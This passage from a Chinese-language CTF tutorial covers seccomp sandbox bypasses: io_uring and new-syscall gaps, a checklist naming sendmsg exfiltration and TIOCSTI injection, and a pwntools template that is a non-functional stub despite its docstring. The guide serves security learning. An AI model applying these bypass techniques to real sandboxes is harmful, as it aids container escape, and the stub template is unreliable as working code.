        printf("Landlock 可用，fd=%d\n", fd);
        close(fd);
    }
}
```

### 10.2 io_uring 后续发展（2024-2026）

io_uring 在容器和 seccomp 场景中的新趋势：

```c
// 1. io_uring 已被许多容器运行时默认禁用
//    - Docker 默认阻止 io_uring（CVE-2022-29582 等）
//    - 但在 CTF 中可能仍然可用

// 2. 新的 io_uring 操作
//    - IORING_OP_URING_CMD：可以通过 io_uring 发送自定义命令
//    - 可能绕过基于系统调用号的过滤器

// 3. SQ polling 模式
//    - 内核线程处理 I/O，不经过 seccomp
//    - 但前提是 io_uring_setup 被允许

// 4. io_uring + 用户通知（2025+）
//    - io_uring 可以与 seccomp user notify 交互
//    - 可能创造新的竞态条件
```

### 10.3 新系统调用绕过（2024-2026）

```c
// 随着内核更新，新系统调用不断引入
// 旧的 seccomp 过滤器可能未覆盖这些新调用

// 关键新系统调用（可能被过滤器遗漏）：
// - clone3 (435)          — 新的 clone 接口
// - openat2 (437)         — 带扩展标志的 openat
// - close_range (436)     — 批量关闭文件描述符
// - io_uring_enter (426)  — io_uring 操作
// - io_uring_setup (425)  — 初始化 io_uring
// - pidfd_send_signal (424) — 向 pidfd 发信号
// - pidfd_open (434)      — 打开 pidfd
// - fsopen (430)          — 新挂载 API
// - open_tree (428)       — 新挂载 API
// - move_mount (429)      — 新挂载 API
// - fsconfig (431)        — 新挂载 API
// - fsmount (432)         — 新挂载 API
// - mount_setattr (442)   — 挂载属性设置
// - landlock_create_ruleset (444) — Landlock

// 策略：枚举内核版本，找出可能未被覆盖的系统调用
```

### 10.4 实用绕过清单（2024-2026 CTF）

```
[ ] 检查 seccomp 模式和过滤器数量
[ ] 使用 PTRACE_SECCOMP_GET_FILTER dump BPF 规则
[ ] 检查 io_uring_enter (425/426) 是否被允许
[ ] 检查新挂载 API (428-432) 是否被允许
[ ] 检查 open_by_handle_at (303) 是否被允许（需 CAP_DAC_READ_SEARCH）
[ ] 检查 userfaultfd 是否被允许
[ ] 检查是否为 permissive 模式（SECCOMP_RET_LOG）
[ ] 检查 sendmsg 是否被允许（用于外泄）
[ ] 检查 TIOCSTI ioctl 是否被允许（用于终端注入）
[ ] 检查 pidfd_open / pidfd_send_signal 是否被允许
[ ] 检查 openat2 (437) 是否被允许
[ ] 检查 close_range (436) 是否被允许（清理 fd）
[ ] 检查 clone3 (435) 是否被允许
[ ] 检查 io_uring 的 IORING_OP_URING_CMD 是否可用
[ ] 利用 seccomp user notify 的时序窗口
[ ] 利用 PTRACE 读取过滤器后精确匹配允许的调用
[ ] 组合多个被允许的系统调用构建利用链
```

### 10.5 编写 seccomp bypass 脚本模板

```python
#!/usr/bin/env python3
"""
CTF seccomp bypass 模板
用于快速检测和绕过 seccomp 限制
"""
from pwn import *

context.arch = 'amd64'

def detect_seccomp(io):
    """通过 sendmsg 外泄检测 seccomp 状态"""

    # 常见系统调用号 (x86_64)
    SYSCALLS = {
        'read': 0, 'write': 1, 'open': 2, 'close': 3,
        'stat': 4, 'fstat': 5, 'mmap': 9, 'mprotect': 10,
        'munmap': 11, 'brk': 12, 'ioctl': 16,
        'access': 21, 'pipe': 22, 'dup2': 33,
        'fork': 57, 'execve': 59, 'exit': 60,
        'getpid': 39, 'sendto': 44, 'recvfrom': 45,
        'socket': 41, 'connect': 42,
        'openat': 257, 'getdents64': 217,
        'open_by_handle_at': 303,
        'io_uring_setup': 425, 'io_uring_enter': 426,
        'open_tree': 428, 'move_mount': 429,
        'fsopen': 430, 'fsconfig': 431, 'fsmount': 432,
        'clone3': 435, 'close_range': 436, 'openat2': 437,
    }

    # 每个系统调用生成一段 shellcode 来测试
    shellcode_template = """
        mov rax, {syscall_num}
        syscall
        ; 返回值 rax: 0=允许, -1=errno, 未返回=被阻止
    """

    return SYSCALLS

# 使用示例
if __name__ == '__main__':
    io = process('./vuln')
    # io = remote('challenge.ctf.com', 1337)

    allowed = detect_seccomp(io)
    print(f"允许的系统调用: {allowed}")
```

---

## 附录：常见 CTF 题型对应的绕过策略

| 题目类型 | 推荐绕过方式 |
|---------|-------------|
| 限制 open/read/write | io_uring、open_by_handle_at、sendmsg 外泄 |
| 限制所有文件操作 | userfaultfd + 竞态、mount API |
| 允许部分调用 | PTRACE_SECCOMP_GET_FILTER 分析 + 精确利用 |
| 容器中的 seccomp | TIOCSTI 注入、新 mount API |
| allowlist 模式 | 找到所有允许的调用并组合使用 |
| SIGSYS 信号处理 | 漏洞触发 + 信号处理器中的利用 |
| seccomp user notify | 时序竞态、通知处理器交互 |
| 仅允许 raw socket | sendmsg UDP 外泄 |

---

> 参考资料：
> - https://www.kernel.org/doc/html/latest/seccomp.html
> - https://man7.org/linux/man-pages/man2/seccomp.2.html
> - https://www.kernel.org/doc/html/latest/userspace-api/io_uring.html
> - CTF Wiki: https://ctf-wiki.org/pwn/linux/kernel/kernel-seccomp/

*Last updated: 2025*
